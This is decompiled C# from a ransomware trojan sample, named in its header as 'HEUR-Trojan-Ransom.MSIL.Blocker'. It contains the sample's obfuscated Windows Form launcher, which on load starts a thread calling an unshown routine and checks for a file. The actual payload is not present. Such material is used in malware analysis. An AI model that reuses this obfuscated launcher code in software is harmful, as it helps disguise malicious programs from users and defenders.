// Decompiled with JetBrains decompiler
// Type: Hgyvpkz.c
// Assembly: NjConsoleApp15, Version=19.10.20069.49826, Culture=neutral, PublicKeyToken=null
// MVID: 025D83C5-2D5C-426E-136A-EFFE7579D761
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1a3b100043d6e616674e8ccf0bd086eacccb6985aa8182029a2717aa57be5f79.exe

using Iezlwrenppcvbtchutuk;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Hgyvpkz
{
  public sealed class c : Form
  {
    private IContainer a;
    private Button b;
    private Button c;
    private Button d;

    public c()
    {
      if (false)
        return;
      this.a();
    }

    private void a(object a, EventArgs b)
    {
      if (true)
        goto label_2;
label_1:
      this.d.PerformClick();
      return;
label_2:
      this.b((object) null, (EventArgs) null);
      goto label_1;
    }

    private void b(object a, EventArgs b)
    {
      ThreadStart start = Hgyvpkz.c.a.b;
      if (start == null)
      {
        ThreadStart threadStart = new ThreadStart(Hgyvpkz.c.a.a.a);
        if (false)
        {
          start = threadStart;
        }
        else
        {
          Hgyvpkz.c.a.b = threadStart;
          start = threadStart;
        }
      }
      Thread thread = new Thread(start);
      thread.Start();
      thread.Join();
    }

    private void c(object a, EventArgs b)
    {
      if (new FileInfo(new ClassLibrary().Data()).Exists)
        return;
      int num = (int) MessageBox.Show("Error");
      if (false)
        ;
    }

    protected override void Dispose(bool a)
    {
      if (a && this.a != null)
        this.a.Dispose();
      int num = a ? 1 : 0;
      if (false)
        return;
      base.Dispose(num != 0);
    }

    private void a()
    {
      Button button1 = new Button();
      if (true)
        goto label_5;
label_1:
      Button button2 = new Button();
      if (true)
        goto label_6;
label_2:
      Button button3 = new Button();
      if (true)
        goto label_7;
label_3:
      if (true)
        goto label_8;
label_4:
      this.b.Location = new Point(12, 12);
      this.b.Name = "button1";
      this.b.Size = new Size(129, 58);
      this.b.TabIndex = 0;
      this.b.Text = "button1";
      this.b.UseVisualStyleBackColor = true;
      this.b.Click += new EventHandler(this.b);
      this.c.Location = new Point(157, 220);
      this.c.Name = "button18";
      this.c.Size = new Size(129, 58);
      this.c.TabIndex = 17;
      this.c.Text = "button18";
      this.c.UseVisualStyleBackColor = true;
      this.d.Location = new Point(321, 97);
      this.d.Name = "button19";
      this.d.Size = new Size(129, 58);
      this.d.TabIndex = 18;
      this.d.Text = "button19";
      this.d.UseVisualStyleBackColor = true;
      this.d.Click += new EventHandler(this.c);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(628, 339);
      this.Controls.Add((Control) this.d);
      this.Controls.Add((Control) this.c);
      this.Controls.Add((Control) this.b);
      this.Name = "Form1";
      this.Text = "Form1";
      this.Load += new EventHandler(this.a);
      this.ResumeLayout(false);
      return;
label_8:
      this.SuspendLayout();
      goto label_4;
label_7:
      this.d = button3;
      goto label_3;
label_6:
      this.c = button2;
      goto label_2;
label_5:
      this.b = button1;
      goto label_1;
    }

    [Serializable]
    private sealed class a
    {
      public static readonly Hgyvpkz.c.a a;
      public static ThreadStart b;

      static a()
      {
        Hgyvpkz.c.a a = new Hgyvpkz.c.a();
        if (false)
          return;
        Hgyvpkz.c.a.a = a;
      }

      public a()
      {
        if (true)
          ;
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal void a()
      {
        if (false)
          return;
        f.a();
      }
    }
  }
}
